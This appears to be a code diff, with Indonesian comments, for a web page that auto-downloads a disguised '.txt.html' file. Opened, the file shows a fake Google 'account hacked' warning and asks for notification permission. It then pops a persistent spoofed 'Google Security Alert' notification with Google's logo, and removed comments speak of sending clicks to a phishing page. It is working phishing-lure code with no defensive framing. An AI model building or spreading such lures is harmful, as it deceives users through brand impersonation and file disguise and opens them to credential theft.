@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Chaining: Alert -> Fake Google Notification</title>
+<title>Fake Google Notification</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -20,10 +20,10 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Chaining: Fake Google Notification</h2>
-<p>Mengunduh file .txt.html yang saat dibuka akan memunculkan alert, lalu memaksa notifikasi sistem palsu (Google).</p>
+<h2>Fake Google Notification</h2>
+<p>Klik tombol untuk mengunduh file .txt.html yang akan menampilkan tombol notifikasi.</p>
 
-<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
+<button id="start-btn" type="button">Generate File</button>
 <div id="status" role="status">Sistem siap.</div>
 </div>
 
@@ -34,88 +34,73 @@ const statusDiv = document.getElementById("status");
 let activeUrls = [];
 let isProcessing = false;
 
-const speak = (message) => {
-    if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel();
-        const utterance = new SpeechSynthesisUtterance(message);
-        utterance.lang = 'id-ID';
-        window.speechSynthesis.speak(utterance);
-    }
-};
-
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
-            "<head><meta charset='UTF-8'><title>Security Alert</title></head>" +
+            "<head><meta charset='UTF-8'><title>System Security</title></head>" +
             "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
             "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
             "    <h2 style='color:#ff4444;margin-bottom:10px;'>⚠️ Security Alert</h2>" +
-            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Kami mendeteksi adanya aktivitas mencurigakan pada akun Google Anda. Klik OK pada notifikasi untuk mengamankan akun.</p>" +
-            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Menunggu konfirmasi...</p>" +
+            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Akun Google Anda terindikasi diretas. Klik tombol di bawah untuk memverifikasi dan mengamankan akun.</p>" +
+            
+            // TOMBOL FISIK UNTUK MEMICU NOTIFIKASI
+            "    <button id='btn-notif' style='background:#0078d4;color:#fff;border:none;padding:15px 30px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer;width:100%;'>Verifikasi Sekarang</button>" +
+            
+            "    <p id='status' style='color:#ff9800;font-size:12px;margin-top:15px;'>Menunggu interaksi...</p>" +
             "</div>" +
             "<script>" +
             "(function(){" +
             "\"use strict\";" +
             
-            "var sudah = false;" +
-            
-            "function picuNotifikasi(){" +
-            "    if (sudah) return;" +
-            "    sudah = true;" +
-            "    var statusEl = document.getElementById('status');" +
-            
-            // 1. Munculkan Alert (sebagai pemicu User Gesture)
-            "    try { alert('Peringatan Keamanan Google: Akun Anda terindikasi diretas. Klik OK untuk memeriksa.'); } catch(e){}" +
-            
-            // 2. Setelah OK diklik, eksekusi Notification API
-            "    if (!('Notification' in window)) {" +
-            "        statusEl.textContent = 'Browser tidak mendukung notifikasi.';" +
-            "        return;" +
-            "    }" +
-            
-            "    if (Notification.permission === 'granted') {" +
-            "        tampilkanNotif();" +
-            "    } else if (Notification.permission !== 'denied') {" +
-            "        Notification.requestPermission().then(function(permission) {" +
-            "            if (permission === 'granted') {" +
-            "                tampilkanNotif();" +
-            "            } else {" +
-            "                statusEl.textContent = 'Izin notifikasi ditolak.';" +
-            "            }" +
-            "        });" +
-            "    }" +
-            "}" +
-            
+            // FUNGSI MENAMPILKAN NOTIFIKASI PALSU
             "function tampilkanNotif(){" +
-            "    var statusEl = document.getElementById('status');" +
             "    try {" +
-            // Memalsukan Notifikasi Google (Ikon & Judul)
             "        var notif = new Notification('Google Security Alert', {" +
             "            body: 'Sesi login tidak dikenal terdeteksi. Klik untuk mengamankan akun Anda.'," +
             "            icon: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'," +
             "            badge: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'," +
             "            tag: 'google-security'," +
-            "            requireInteraction: true" + // Notifikasi tidak hilang sampai diklik
+            "            requireInteraction: true" +
             "        });" +
-            
-            // Aksi saat notifikasi diklik
             "        notif.onclick = function() {" +
             "            window.focus();" +
-            // Arahkan ke halaman phishing atau picu unduhan
-            "            window.location.href = 'https://accounts.google.com'; " + 
+            "            window.location.href = 'https://accounts.google.com';" + 
             "        };" +
-            "        statusEl.textContent = 'Notifikasi Google palsu berhasil ditampilkan!' ;" +
-            "        statusEl.style.color = '#0f0';" +
+            "        document.getElementById('status').textContent = 'Notifikasi palsu berhasil muncul!' ;" +
+            "        document.getElementById('status').style.color = '#4CAF50';" +
             "    } catch(e) {" +
-            "        statusEl.textContent = 'Gagal menampilkan notifikasi: ' + e.message;" +
+            "        document.getElementById('status').textContent = 'Gagal: ' + e.message;" +
             "    }" +
             "}" +
+
+            // EVENT LISTENER PADA TOMBOL (User Gesture)
+            "document.getElementById('btn-notif').addEventListener('click', function() {" +
+            "    var btn = this;" +
+            "    btn.disabled = true;" +
+            "    btn.textContent = 'Meminta Izin...';" +
             
-            // TRIGGER: Klik di mana saja memicu alert & notifikasi
-            "document.addEventListener('click', picuNotifikasi);" +
-            "document.addEventListener('touchstart', picuNotifikasi);" +
+            "    if (!('Notification' in window)) {" +
+            "        document.getElementById('status').textContent = 'Browser tidak mendukung notifikasi.';" +
+            "        return;" +
+            "    }" +
+            
+            // Meminta izin dengan Promise
+            "    Notification.requestPermission().then(function(permission) {" +
+            "        if (permission === 'granted') {" +
+            "            tampilkanNotif();" +
+            "            btn.textContent = 'Terverifikasi';" +
+            "        } else {" +
+            "            document.getElementById('status').textContent = 'Izin notifikasi ditolak oleh pengguna.';" +
+            "            btn.disabled = false;" +
+            "            btn.textContent = 'Verifikasi Sekarang';" +
+            "        }" +
+            "    }).catch(function(err) {" +
+            "        document.getElementById('status').textContent = 'Error: ' + err.message;" +
+            "    });" +
+            "});" +
+
             "})();" +
             "<\/script>" +
             "</body>" +
@@ -131,7 +116,7 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    link.download = `google-security-${fileData.id}.txt.html`; // Ekstensi ganda
+    link.download = `google-security-${fileData.id}.txt.html`; 
     link.textContent = `Download google-security.txt.html`;
     link.style.display = "none";
     document.body.appendChild(link);
@@ -143,19 +128,14 @@ startBtn.addEventListener("click", () => {
     if (isProcessing) return;
     isProcessing = true;
     startBtn.disabled = true;
-    statusDiv.textContent = "Menyiapkan file Fake Notification...";
-
-    speak("Menyiapkan file notifikasi palsu.");
-
-    const root = document.documentElement;
-    try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}
+    statusDiv.textContent = "Menyiapkan file...";
 
     setTimeout(async () => {
         try {
             const fileData = await prepareMimeBlobAsync(1);
             activeUrls.push(fileData.url);
             triggerInstantDownload(fileData);
-            statusDiv.textContent = "File berhasil diunduh. Buka file dan klik layar.";
+            statusDiv.textContent = "File berhasil diunduh. Buka dan klik tombol 'Verifikasi Sekarang'.";
         } catch(e) {
             statusDiv.textContent = "Gagal: " + e.message;
         }
